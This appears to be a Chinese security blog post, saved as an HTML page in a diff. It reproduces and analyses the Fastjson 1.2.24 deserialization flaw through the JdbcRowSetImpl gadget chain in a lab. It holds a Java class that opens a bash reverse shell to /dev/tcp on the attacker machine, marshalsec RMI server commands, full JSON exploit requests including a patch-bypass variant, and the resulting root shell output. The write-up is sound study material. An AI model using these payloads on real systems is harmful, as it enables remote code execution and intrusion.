@@ -1,0 +1,581 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title> - FeatherStark/14m3ta7k</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="TriDiamond Obsidian,"> 
+    <meta name="description" content="This is my hexo blog,Fastjson 1.2.24 反序列化漏洞及JdbcRowSetImpl利用链分析
+Fastjson 是一个 Java 库,可以将 Java 对象转换为 JSON 格式,当然它也可以将 JSON ,"> 
+    <meta name="author" content="14m3ta7k"> 
+    <link rel="alternative" href="atom.xml" title="FeatherStark/14m3ta7k" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
+
+    
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
+
+    
+<link rel="stylesheet" href="/css/obsidian.css">
+
+    
+<link rel="stylesheet" href="/css/ball-atom.min.css">
+
+    
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css">
+
+    
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="loading">
+    <div class="loader">
+        <div class="la-ball-atom la-2x">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+    <span id="config-title" style="display:none">FeatherStark/14m3ta7k</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div class="scrollbar gradient-bg-rev"></div>
+<div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <div class="navigation animated fadeIn fast delay-1s">
+        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="https://featherstark.github.io">
+        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
+        <h3 class="subtitle"></h3>
+        <div class="social">
+            <!--        <div class="like-icon">-->
+            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+            <!--        </div>-->
+            <div>
+                <div class="share">
+                    
+                        <a href="javascript:;" class="iconfont icon-share1"></a>
+                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    <div class="section">
+        <div class=article-header-wrapper>
+    <div class="article-header">
+        <div class="article-cover animated fadeIn" style="
+            animation-delay: 600ms;
+            animation-duration: 1.2s;
+            background-image: 
+                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+                url('/img/cover.jpg') ">
+        </div>
+        <div class="else">
+            <p class="animated fadeInDown">
+                
+                <a href="javascript:;"><b>「 </b>文章<b> 」</b></a>
+                
+                十一月 25, 2021
+            </p>
+            <h3 class="post-title animated fadeInDown"><a href="/2021/11/fastjson%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%20%EF%BC%88CNVD-2017-02833%EF%BC%89/" title="Untitled" class="">Untitled</a>
+            </h3>
+            
+            <p class="post-count animated fadeInDown">
+                
+                <span>
+                    <b class="iconfont icon-text2"></b> <i>文章字数</i>
+                    9.4k
+                </span>
+                
+                
+                <span>
+                    <b class="iconfont icon-timer__s"></b> <i>阅读约需</i>
+                    9 mins.
+                </span>
+                
+                
+                
+                <span id="busuanzi_container_page_pv">
+                    <b class="iconfont icon-read"></b> <i>阅读次数</i>
+                    <span id="busuanzi_value_page_pv">0</span>
+                </span>
+                
+            </p>
+            
+            
+        </div>
+    </div>
+</div>
+
+<div class="screen-gradient-after">
+    <div class="screen-gradient-content">
+        <div class="screen-gradient-content-inside">
+            <div class="bold-underline-links screen-gradient-sponsor">
+                <p>
+                    <span class="animated fadeIn delay-1s"></span>
+                </p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="article">
+    <div class='main'>
+        <div class="content markdown animated fadeIn">
+            <h2 id="Fastjson-1-2-24-反序列化漏洞及JdbcRowSetImpl利用链分析"><a href="#Fastjson-1-2-24-反序列化漏洞及JdbcRowSetImpl利用链分析" class="headerlink" title="Fastjson 1.2.24 反序列化漏洞及JdbcRowSetImpl利用链分析"></a>Fastjson 1.2.24 反序列化漏洞及JdbcRowSetImpl利用链分析</h2><blockquote>
+<p>Fastjson 是一个 Java 库,可以将 Java 对象转换为 JSON 格式,当然它也可以将 JSON 字符串转换为 Java 对象 fastjson在解析json的过程中,支持使用@type字段来指定反序列化的类型,并调用该类的set/get方法来访问属性,当组件开启了autotype功能并且反序列化不可信数据时,攻击者可以构造数据, 使目标应用的代码执行流程进入特定类的特定setter或者getter方法中,即可构造出一些恶意利用链。</p>
+</blockquote>
+<h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><pre><code>fastjson 1.2.24
+jdk 1.8.0_291
+攻击机：win10 :: 192.168.87.1
+靶机：ubuntu :: 192.168.87.132
+</code></pre>
+<h3 id="准备部分"><a href="#准备部分" class="headerlink" title="准备部分"></a>准备部分</h3><p>test.java（恶意文件）</p>
+<pre><code class="java">import java.lang.Runtime;
+import java.lang.Process;
+
+public class test&#123;
+    static &#123;
+        try &#123;
+            Runtime rt = Runtime.getRuntime();
+            String[] commands = &#123;&quot;bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/192.168.87.1/3312 0&gt;&amp;1&quot;&#125;;
+            Process pc = rt.exec(commands);
+            pc.waitFor();
+        &#125; catch (Exception e) &#123;
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>marshalsec-master <a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></p>
+<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><p><strong>1.正常访问</strong></p>
+<p><strong>2.编译恶意文件,并在本地开启一个web服务器，这里使用的是python2的SimpleHTTPServer</strong></p>
+<pre><code class="bash">javac test.java
+</code></pre>
+<pre><code>python -m SimpleHTTPServer 3310 #将编译好的class放到此文件夹中
+</code></pre>
+<pre><code>D:\ProgramCode\server&gt;python -m SimpleHTTPServer 3310
+
+
+Serving HTTP on 0.0.0.0 port 3310 ...
+192.168.87.132 - - [06/Aug/2021 14:37:15] &quot;GET /test.class HTTP/1.1&quot; 200 -
+</code></pre>
+<p><strong>3.本地环境下，使用marshalsec开启一个rmi服务并监听3311端口,用nc监听3312端口</strong></p>
+<pre><code class="bash">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.87.1:3310/#test&quot; 3311
+
+
+* Opening JRMP listener on 3311
+</code></pre>
+<pre><code class="bash">PS C:\Users\nouser&gt; nc -nvlp 3312
+
+
+listening on [any] 3312 ...
+</code></pre>
+<p><strong>4.构造请求并发送</strong></p>
+<pre><code class="http">POST / HTTP/1.1
+Host: 192.168.87.132:12117
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Content-Type: application/json
+Content-Length: 259
+
+&#123;
+    &quot;a&quot;:&#123;
+        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,
+        &quot;dataSourceName&quot;:&quot;rmi://192.168.87.1:3311/test&quot;,
+        &quot;autoCommit&quot;:true
+    &#125;
+&#125;
+</code></pre>
+<p><strong>补丁POC(CNVD-2019-22238)</strong></p>
+<pre><code class="json">&#123;
+    &quot;a&quot;:&#123;
+        &quot;@type&quot;:&quot;java.lang.Class&quot;,
+        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;
+    &#125;,
+    &quot;b&quot;:&#123;
+        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,
+        &quot;dataSourceName&quot;:&quot;rmi://192.168.87.1:3311/test&quot;,
+        &quot;autoCommit&quot;:true
+    &#125;
+&#125;
+</code></pre>
+<p>5.成功反弹shell</p>
+<pre><code class="bash">PS C:\Users\nouser&gt; nc -nvlp 3312
+listening on [any] 3312 ...
+connect to [192.168.87.1] from (UNKNOWN) [192.168.87.132] 39378
+
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@1b033d50f756:/# ls
+ls
+bin
+boot
+dev
+etc
+home
+lib
+lib64
+media
+mnt
+</code></pre>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="autotype"><a href="#autotype" class="headerlink" title="autotype"></a>autotype</h3><p>fastjson提供了autotype功能，允许用户在反序列化过程中通过<code>@type</code>指定反序列化的Class类型，这个字段可以指定反序列化的任意类，并且会自动调用类中属性的特定的set、get方法。在1.2.24版本及之前，autotype默认开启，没有限制，在之后的版本中加入了黑名单限制，默认关闭autotype等机制。</p>
+<h3 id="RMI触发点"><a href="#RMI触发点" class="headerlink" title="RMI触发点"></a>RMI触发点</h3><p>由于这里的DataSourceName值经过构造后可控，导致了RMI反序列化漏洞</p>
+<pre><code class="java">DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
+</code></pre>
+<h3 id="漏洞点反向跟踪分析"><a href="#漏洞点反向跟踪分析" class="headerlink" title="漏洞点反向跟踪分析"></a>漏洞点反向跟踪分析</h3><p>这里首先跟踪lookup方法，在connect()方法中当getDataSourceName不为空时，会触发lookup方法。</p>
+<pre><code class="java">    private Connection connect() throws SQLException &#123;
+        if (this.conn != null) &#123;
+            return this.conn;
+        &#125; else if (this.getDataSourceName() != null) &#123;
+            try &#123;
+                InitialContext var1 = new InitialContext();
+                DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
+                return this.getUsername() != null &amp;&amp; !this.getUsername().equals(&quot;&quot;) ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();
+            &#125; catch (NamingException var3) &#123;
+                throw new SQLException(this.resBundle.handleGetObject(&quot;jdbcrowsetimpl.connect&quot;).toString());
+            &#125;
+        &#125; else &#123;
+            return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;
+        &#125;
+    &#125;
+</code></pre>
+<p>再来看connect()是怎么被调用的，这里我们找到了调用connect()的三个方法</p>
+<pre><code>prepare()
+getDatabaseMetaData()
+setAutoCommit()
+</code></pre>
+<p>经分析，前两个无法进行调用，这里我们来看setAutoCommit()方法</p>
+<pre><code class="java">public void setAutoCommit(boolean var1) throws SQLException &#123;
+    if (this.conn != null) &#123;
+        this.conn.setAutoCommit(var1);
+    &#125; else &#123;
+        this.conn = this.connect();
+        this.conn.setAutoCommit(var1);
+    &#125;
+&#125;
+</code></pre>
+<p>这里上面有提到，fastjson在反序列化时，自动对字符串的属性进行调用对应的set、get方法，即上面设置了autoCommit的值时(传入的值需要符合AutoCommit传入值的类型)，就会调用setAutoCommit方法。其中conn在初始化的时候为null，所以以上的if else语句中都会走else分支。</p>
+<h2 id="流程思路"><a href="#流程思路" class="headerlink" title="流程思路"></a>流程思路</h2><h3 id="EXP解析"><a href="#EXP解析" class="headerlink" title="EXP解析"></a>EXP解析</h3><pre><code class="java">&#123;&quot;a&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://192.168.87.1:3311/test&quot;,&quot;autoCommit&quot;:true&#125;&#125;
+</code></pre>
+<p><code>@type</code> 相当于<code>autotype</code> ，当Fastjson开启了<code>autotype</code>时，<code>autotype</code>会自动指定其值对应的类，对于<code>dataSourceName</code>，用于指定一个远程加载class的地址，<code>autoCommit</code>用于构造下文中的Gadget。</p>
+<h3 id="服务端解析流程"><a href="#服务端解析流程" class="headerlink" title="服务端解析流程"></a>服务端解析流程</h3><p>当<code>autotype</code>指定了<code>com.sun.rowset.JdbcRowSetImpl</code>类时，后面的参数会自动调用该类的相关方法。同时，因为我们设置了<code>autoCommit</code>的值，根据Fastjson的特性，java会自动调用该类中的get和set方法，即会调用<code>setAutoCommit</code>方法。</p>
+<pre><code class="java">public void setAutoCommit(boolean var1) throws SQLException &#123;
+    if (this.conn != null) &#123;
+        this.conn.setAutoCommit(var1);
+    &#125; else &#123;
+        this.conn = this.connect();
+        this.conn.setAutoCommit(var1);
+    &#125;
+&#125;
+</code></pre>
+<p>从上方代码可以看出，<code>setAutoCommit</code>方法的else分支调用了<code>connect()</code>方法，由于conn初始值为null，且并没有对其做任何操作，所以<code>this.conn</code>的值为null，即走else分支，调用了<code>connect()</code>方法。往下继续看<code>connect()</code>方法：</p>
+<pre><code class="java">    private Connection connect() throws SQLException &#123;
+        if (this.conn != null) &#123;
+            return this.conn;
+        &#125; else if (this.getDataSourceName() != null) &#123;
+            try &#123;
+                InitialContext var1 = new InitialContext();
+                DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
+                return this.getUsername() != null &amp;&amp; !this.getUsername().equals(&quot;&quot;) ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();
+            &#125; catch (NamingException var3) &#123;
+                throw new SQLException(this.resBundle.handleGetObject(&quot;jdbcrowsetimpl.connect&quot;).toString());
+            &#125;
+        &#125; else &#123;
+            return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;
+        &#125;
+    &#125;
+</code></pre>
+<p>这里conn的值为null，所以继续往下走<code>else if</code>分支，因为在exp中，我们设置了<code>dataSourceName</code>的值，所以这里<code>this.getDataSourceName() != null</code>成立，即程序走该分支。在该分支中，<code> DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());</code> <code>lookup()</code>方法远程加载了<code>DataSourceName</code>，也就是我们exp中传入的<code>DataSourceName</code>的值:<code>rmi://192.168.87.1:3311/test</code>，因此服务端会远程加载一个class类，而这个类就是我们恶意构造的类，地址是我们传入的可控地址，达到反序列化的目的。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>漏洞起因是在<code>JdbcRowSetImpl.class</code>文件中 <code>lookup()</code>发起了一个rmi服务，由于<code>lookup()</code>中的<code> DataSourceName()</code>可控，导致rmi远程地址由用户可控，通过传入<code> autoCommit</code>的值来调用<code> setAutoCommit</code>，从而调用<code> connect()</code> 方法，进而调用内部的<code>lookup() </code>方法，传入<code> dataSourceName</code> 的值来控制rmi的远程地址，达到任意代码执行目的。由于默认开启了<code> autotype</code>，因此我们可以在将 <code>  @type</code> 的值设置为 <code>JdbcRowSetImpl</code>类，使用该类进行反序列化操作。</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls"
+                data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+            <ul id="audio-list" style="display:none">
+                
+                
+                <li title='0' data-url='/statics/mohewuting.m4a'></li>
+                
+                    
+            </ul>
+            
+                        
+            
+            
+        </div>
+        <div class="sidebar">
+            <div class="box animated fadeInRight">
+                <div class="subbox">
+                    <img src="https://avatars.githubusercontent.com/u/42148584?v=4" height=300 width=300></img>
+                    <p>14m3ta7k</p>
+                    <span>Think like an artist, develop like an artisan</span>
+                    <dl>
+                        
+                            
+                            
+                            
+                        
+                        
+                    </dl>
+                </div>
+                <ul>
+                    <li><a href="/">2 <p>文章</p></a></li>
+                    <li><a href="/categories">0 <p>分类</p></a></li>
+                    <li><a href="/tags">0 <p>标签</p></a></li>
+                </ul>
+            </div>
+            
+            
+            
+            <div class="box sticky animated fadeInRight faster">
+                <div id="toc" class="subbox">
+                    <h4>目录</h4>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastjson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8AJdbcRowSetImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">Fastjson 1.2.24 反序列化漏洞及JdbcRowSetImpl利用链分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83"><span class="toc-number">2.</span> <span class="toc-text">复现环境</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%86%E5%A4%87%E9%83%A8%E5%88%86"><span class="toc-number">2.1.</span> <span class="toc-text">准备部分</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-number">2.2.</span> <span class="toc-text">工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E6%AD%A5%E9%AA%A4"><span class="toc-number">3.</span> <span class="toc-text">复现步骤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#autotype"><span class="toc-number">4.1.</span> <span class="toc-text">autotype</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RMI%E8%A7%A6%E5%8F%91%E7%82%B9"><span class="toc-number">4.2.</span> <span class="toc-text">RMI触发点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9%E5%8F%8D%E5%90%91%E8%B7%9F%E8%B8%AA%E5%88%86%E6%9E%90"><span class="toc-number">4.3.</span> <span class="toc-text">漏洞点反向跟踪分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B%E6%80%9D%E8%B7%AF"><span class="toc-number">5.</span> <span class="toc-text">流程思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP%E8%A7%A3%E6%9E%90"><span class="toc-number">5.1.</span> <span class="toc-text">EXP解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%A7%A3%E6%9E%90%E6%B5%81%E7%A8%8B"><span class="toc-number">5.2.</span> <span class="toc-text">服务端解析流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text">总结</span></a></li></ol>
+                </div>
+            </div>
+            
+            
+        </div>
+    </div>
+</div>
+
+    </div>
+</div>
+    <div id="back-to-top" class="animated fadeIn faster">
+        <div class="flow"></div>
+        <span class="percentage animated fadeIn faster">0%</span>
+        <span class="iconfont icon-top02 animated fadeIn faster"></span>
+    </div>
+</body>
+<footer>
+    <p class="copyright" id="copyright">
+        &copy; 2021
+        <span class="gradient-text">
+            14m3ta7k
+        </span>.
+        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
+        Theme
+        <span class="gradient-text">
+            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
+        </span>
+        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.9.3" target="_blank" rel="noopener">v1.4.9.3</a></small>
+        
+        </br>
+        鲁ICP备
+        <span class="gradient-text">
+            <a href="https://beian.miit.gov.cn/" title="2020045977号" target="_blank" rel="noopener">2020045977号</a>
+        </span>
+        
+        
+    </p>
+</footer>
+
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<script>
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+      preferredFont: "TeX",
+      availableFonts: ["STIX", "TeX"],
+      linebreaks: {
+        automatic: true
+      },
+      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+      inlineMath: [
+        ["$", "$"],
+        ["\\(", "\\)"]
+      ],
+      processEscapes: true,
+      ignoreClass: "tex2jax_ignore|dno",
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+      noUndefined: {
+        attributes: {
+          mathcolor: "red",
+          mathbackground: "#FFEEEE",
+          mathsize: "90%"
+        }
+      },
+      Macros: {
+        href: "{}"
+      }
+    },
+    messageStyle: "none"
+  });
+</script>
+<script>
+  function initialMathJax() {
+    MathJax.Hub.Queue(function () {
+      var all = MathJax.Hub.getAllJax(),
+        i;
+      // console.log(all);
+      for (i = 0; i < all.length; i += 1) {
+        console.log(all[i].SourceElement().parentNode)
+        all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+    });
+  }
+
+  function reprocessMathJax() {
+    if (typeof MathJax !== 'undefined') {
+      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
+    }
+  }
+</script>
+
+
+ 
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/obsidian.js"></script>
+<script src="/js/jquery.truncate.js"></script>
+<script src="/js/search.js"></script>
+ 
+<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
+ 
+<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
+ 
+<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+
+<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>
+ 
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>
+  
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>
+  
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>
+  
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>
+  
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>
+  
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>
+  
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>
+  
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>
+   
+<script src="/js/busuanzi.min.js"></script>
+
+<script>
+  $(document).ready(function () {
+    if ($('span[id^="busuanzi_"]').length) {
+      initialBusuanzi();
+    }
+  });
+</script>
+ 
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
+
+
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+  
+
+<script>
+  function initialTyped() {
+    var typedTextEl = $('.typed-text');
+    if (typedTextEl && typedTextEl.length > 0) {
+      var typed = new Typed('.typed-text', {
+        strings: ['Think like an artist, develop like an artisan', '艺术家思维去思考问题，工匠创造精神去开发'],
+        typeSpeed: 90,
+        loop: true,
+        loopCount: Infinity,
+        backSpeed: 20,
+      });
+    }
+  }
+
+  if ($('.article-header') && $('.article-header').length) {
+    $(document).ready(function () {
+      initialTyped();
+    });
+  }
+</script>
+
+
+
+
+
+
+
+</html>
